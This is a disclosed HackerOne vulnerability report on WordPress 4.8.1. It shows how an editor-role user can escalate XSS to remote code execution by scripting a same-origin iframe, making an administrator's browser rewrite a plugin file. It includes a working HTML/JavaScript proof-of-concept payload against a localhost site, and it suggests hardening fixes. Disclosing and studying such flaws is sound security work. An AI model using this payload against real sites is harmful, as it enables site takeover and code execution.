# Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general

## Report Details
- **Report ID**: 263718
- **URL**: https://hackerone.com/reports/263718
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-08-27T01:55:26.996Z
- **Disclosed**: 2017-10-04T18:53:41.370Z

## Reporter
- **Username**: skansing
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
#Background
This report is mainly about how a user with the role of editor, expectedly can post unfiltered content
but unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.

Secondarily the report wants to highlight the technique used and the severity of it.

#Description
During my research I found that a XSS can, in the majority of cases, trivially be turned
into a RCE, by abusing same origin frame scripting in the XSS payload.

I demonstrated this "technique" in #263058 and #263109 (no need to read, there a POC in this report).
It can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.
This adds to the severity of XSS in core wp, themes and especially plugins.

It affect the understanding of the user role 'editor' and the ability to post unfiltered content
https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html

An editor is a copy-paste and a administrator visit from RCE or performing any action.
Editors users / accounts them self are more attractive for cracking and social engineering.
Administrators are not aware of the risk associated with giving a user editor role or being a editor.
All future reports with XSS can be escalated to RCE resulting in increased severity.


# POC
This POC explores a rogue editor planting payload to RCE.

- Login as editor
- Upload a .html or plant the POC payload in content
- Login as administrator visit a link containing the payload

# POC Payload
The payload opens the plugin editor, edits a file and redirects to the edited file afterwards

```
<iframe src="http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php" style="opacity:0">
</iframe>
<script>
setTimeout(function() {
  var p = "<?php phpinfo();"
  // full read/write control over dom, do anything(!)
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
</script>
```

# Suggested Fix
the role editor should loose all privileges that can lead to scripting

consideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.
However that can by bypassed by using `window.open(...)` instead of an iframe, but requires
the victim to click on the page after opening it. so this will only harden a bit.

another hardening option could be requiring password on critical actions such as
plugin install, file edit, etc. it will however have an impact on accessibility and
it might take time to find all the loop holes.


## Attachments
No attachments
